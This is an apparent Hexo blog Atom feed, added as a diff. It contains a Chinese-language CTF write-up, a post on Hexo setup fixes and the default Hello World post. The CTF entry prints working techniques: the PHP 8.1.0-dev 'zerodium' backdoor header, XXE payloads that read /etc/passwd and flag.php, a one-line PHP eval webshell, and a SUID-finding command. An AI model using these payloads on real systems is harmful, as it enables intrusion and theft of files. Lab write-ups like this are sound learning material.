@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>XINDEWIN</title>
+  
+  <subtitle>xindewin&#39;s world</subtitle>
+  <link href="http://example.com/atom.xml" rel="self"/>
+  
+  <link href="http://example.com/"/>
+  <updated>2021-06-03T13:17:37.819Z</updated>
+  <id>http://example.com/</id>
+  
+  <author>
+    <name>xindewin</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>blog2 20210601cumtctf</title>
+    <link href="http://example.com/2021/06/03/blog2-20210601cumtctf/"/>
+    <id>http://example.com/2021/06/03/blog2-20210601cumtctf/</id>
+    <published>2021-06-03T00:40:49.000Z</published>
+    <updated>2021-06-03T13:17:37.819Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="0x01web签到"><a href="#0x01web签到" class="headerlink" title="0x01web签到"></a>0x01web签到</h2><p><img src="D:\xindewin.blog\source_posts\blog2-20210601cumtctf\php8.0.1.png"></p><p>查看题目，看到“I’m the best language in the world！！！”。联想到php是世界上最好的语言，所有这题肯定和php有关。因为之前有入门赛出过类似的谜语题，当时post bxs=什么什么就出flag了，还以为这题也一样，结果传了好一会没用，后来抓包试试，查看返回包。</p><p><img src="D:\xindewin.blog\source_posts\blog2-20210601cumtctf\2.png"></p><p>发现php版本信息，版本为php/8.1.0-dev，该版本可能存在后门。</p><p><strong>php/8.1.0-dev后门漏洞</strong></p><p>可以通过发送User-Agentt头来执行任意代码。</p><p>示例：</p><p><img src="D:\xindewin.blog\source_posts\blog2-20210601cumtctf\3.png"></p><p>添加<code>User-Agentt:zerodiumvar_dump(2*3);</code>发现代码被执行；接着请求<code>User-Agentt:zerodiumsystem(&quot;cat flag.php&quot;);</code> 或者<code>User-Agentt:zerodiumshow_source(&quot;flag.php&quot;);</code> 查看flag.php。</p><p><img src="D:\xindewin.blog\source_posts\blog2-20210601cumtctf\4.png"></p><p>拿到flag</p><p>tips：大佬说谜语题一般是找备份文件，挨个网页看源代码，看返回响应头</p><h2 id="0x02别大E"><a href="#0x02别大E" class="headerlink" title="0x02别大E"></a>0x02别大E</h2><p><strong>xxe漏洞</strong></p><p>参考文章：<a href="https://blog.csdn.net/zxpo/article/details/4020701">https://blog.csdn.net/zxpo/article/details/4020701</a>（示例明显能看到实体的作用）</p><p><a href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a>（xxe漏洞/xml基础知识）</p><p><a href="https://blog.csdn.net/qq_45521281/article/details/106112654">https://blog.csdn.net/qq_45521281/article/details/106112654</a>一道典型的xxe ctf，和此题差不多。</p><p>回到此题</p><p><img src="D:\xindewin.blog\source_posts\blog2-20210601cumtctf\2.1.png"></p><p>抓包，post传payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY test SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;  &#x2F;&#x2F;实体定义+读取敏感文件</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;test;&lt;&#x2F;username&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure><p><img src="D:\xindewin.blog\source_posts\blog2-20210601cumtctf\2.4.png"></p><p>能够读到敏感信息，试着读取flag所在文件，一般flag在flagphp,flag.txt等等。</p><p>这题可查看页面源代码</p><p><img src="D:\xindewin.blog\source_posts\blog2-20210601cumtctf\2.7.png"></p><p><img src="D:\xindewin.blog\source_posts\blog2-20210601cumtctf\2.8.png"></p><p>尝试访问aGludHR0.php，知道了flag在flag.php中</p><p><img src="D:\xindewin.blog\source_posts\blog2-20210601cumtctf\2.6.png"></p><p>构建payload，读取flag.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY test SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;test;&lt;&#x2F;username&gt;&lt;password&gt;0&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure><p>base64解码就行</p><h2 id="0x03get-shell"><a href="#0x03get-shell" class="headerlink" title="0x03get shell"></a>0x03get shell</h2><p>这题就写一下看学长做的一种方法吧，其它的暂时不会。</p><p>用到的工具：</p><p>php混淆类代码解密在线网站：<a href="https://www.zhaoyuanma.com/phpjm.html">https://www.zhaoyuanma.com/phpjm.html</a>，蚁剑。</p><p>看题</p><p><img src="D:\xindewin.blog\source_posts\blog2-20210601cumtctf\canvas.png"></p><p>放在解码网站里解得</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXWT);</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[ymlisisisiook]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可见是一句话木马，查看phpinfo.php，发现有些函数被禁了</p><p><img src="D:\xindewin.blog\source_posts\blog2-20210601cumtctf\3.1.png"></p><p>其中包括system等，能够进行命令执行的函数被禁。上蚁剑绕过disable_functions。</p><p><img src="D:\xindewin.blog\source_posts\blog2-20210601cumtctf\3.2.png">密码为ymlisisisiook</p><p>上插件，成功后编辑数据，网址后面加上.antproxy.php,密码不变</p><p><img src="D:\xindewin.blog\source_posts\blog2-20210601cumtctf\3.3.png"></p><p><img src="D:\xindewin.blog\source_posts\blog2-20210601cumtctf\3.4.png"></p><p>这时候就发现能访问到上级目录了</p><p><img src="D:\xindewin.blog\source_posts\blog2-20210601cumtctf\3.5.png"></p><p>发现flag文件，但点进去没有，说明还没有权限</p><p>用suid命令<code>find / -perm -u=s -type f 2&gt;/dev/null</code>查找有权限查看文件的命令，发现有cat，然后查看/flag即可。</p><p><img src="D:\xindewin.blog\source_posts\blog2-20210601cumtctf\3.6.png"></p><p>电脑没电，回去接着写！</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;0x01web签到&quot;&gt;&lt;a href=&quot;#0x01web签到&quot; class=&quot;headerlink&quot; title=&quot;0x01web签到&quot;&gt;&lt;/a&gt;0x01web签到&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;D:\xindewin.blog\source_posts\bl</summary>
+      
+    
+    
+    
+    
+    <category term="blog" scheme="http://example.com/tags/blog/"/>
+    
+    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
+    
+    <category term="web" scheme="http://example.com/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>blog1 搭建博客中遇到的问题</title>
+    <link href="http://example.com/2021/03/15/blog1-%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
+    <id>http://example.com/2021/03/15/blog1-%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</id>
+    <published>2021-03-15T08:13:32.000Z</published>
+    <updated>2021-06-03T13:38:13.262Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="1-在hexo-clean-hexo-g-hexo-d三步后出现404页面"><a href="#1-在hexo-clean-hexo-g-hexo-d三步后出现404页面" class="headerlink" title="1.在hexo clean+hexo g+hexo d三步后出现404页面"></a>1.在hexo clean+hexo g+hexo d三步后出现404页面</h2><p>​     其实只是少做了一步操作，就是在github的setting（翻到底层）在github page中的custom domian中输入自己的域名即可，每次进行hexo clean操作后都要重复该操作，不过也可能是因为我绑定了属于自己的域名的缘故。</p><h2 id="2-在hexo-clean时或者hexo-g时出现指向冒号的报错"><a href="#2-在hexo-clean时或者hexo-g时出现指向冒号的报错" class="headerlink" title="2.在hexo clean时或者hexo g时出现指向冒号的报错"></a>2.在hexo clean时或者hexo g时出现指向冒号的报错</h2><p>​     一般出现这种错误是因为冒号后面没有打空格，但是确实后面打空格了，但还是报错，最终无法再删掉了blog文件，再来一次就ok了。</p><h2 id="3-域名绑定"><a href="#3-域名绑定" class="headerlink" title="3.域名绑定"></a>3.域名绑定</h2><p>​     看了各种教程，其实只需要搞定两个地方就行，一是在域名解析器中加入CANEM记录，前面一格填@即可，填@域名为xindewin.cn;www则为<a href="http://www.xindewin.cn/">www.xindewin.cn</a>  ；二是在github page中的custom domian中输入自己的域名即可。会有一小会的延迟，不要着急。记得域名要实名，不然也是不成功的。</p><h2 id="4-hexo-g部署文章时报错-err-YAMLException-can-not-read-a-block-mapping-entry-a-multiline-key-may-not-be-an-implicit-key-at-line-4-column-1"><a href="#4-hexo-g部署文章时报错-err-YAMLException-can-not-read-a-block-mapping-entry-a-multiline-key-may-not-be-an-implicit-key-at-line-4-column-1" class="headerlink" title="4.hexo g部署文章时报错 err: YAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at line 4, column 1:"></a>4.hexo g部署文章时报错 err: YAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at line 4, column 1:</h2><p>（空行）</p><p>  其实这个问题line 4多了一排空行，不要纠结at\node_modules\hexo-front-matter\node_modules\js-yaml\lib\js-yaml\loader.js之类的文字。</p><h2 id="5访问页面出现extends-includes-layout-pug-block-content-include-includes-recent-posts-pug-include-includes-partial"><a href="#5访问页面出现extends-includes-layout-pug-block-content-include-includes-recent-posts-pug-include-includes-partial" class="headerlink" title="5访问页面出现extends includes/layout.pug block content include includes/recent-posts.pug include includes/partial"></a>5访问页面出现<code>extends includes/layout.pug block content include includes/recent-posts.pug include includes/partial</code></h2><p>在git bash中输入<code>npm install --save hexo-renderer-jade hexo-generator-feed hexo-generator-sitemap hexo-browsersync hexo-generator-archive</code></p><p>再</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p><strong>还没下载图片插件，第一篇blog写得比较简陋，不过也是一个好的开始，希望之后能耐心写下更多的学习或者经验内容，也很感谢azuki，在我网络搜寻无果解决不了问题的时候给予了我许多帮助，而且博客一开始也是他花时间带我下的，不然我一个小白也不知道还可以写博客，哈哈。</strong>     </p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;1-在hexo-clean-hexo-g-hexo-d三步后出现404页面&quot;&gt;&lt;a href=&quot;#1-在hexo-clean-hexo-g-hexo-d三步后出现404页面&quot; class=&quot;headerlink&quot; title=&quot;1.在hexo clean+hexo</summary>
+      
+    
+    
+    
+    
+    <category term="hexo" scheme="http://example.com/tags/hexo/"/>
+    
+    <category term="blog" scheme="http://example.com/tags/blog/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Hello World</title>
+    <link href="http://example.com/2021/03/11/hello-world/"/>
+    <id>http://example.com/2021/03/11/hello-world/</id>
+    <published>2021-03-11T14:31:25.348Z</published>
+    <updated>2021-03-11T14:31:25.348Z</updated>
+    
+    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+</feed>
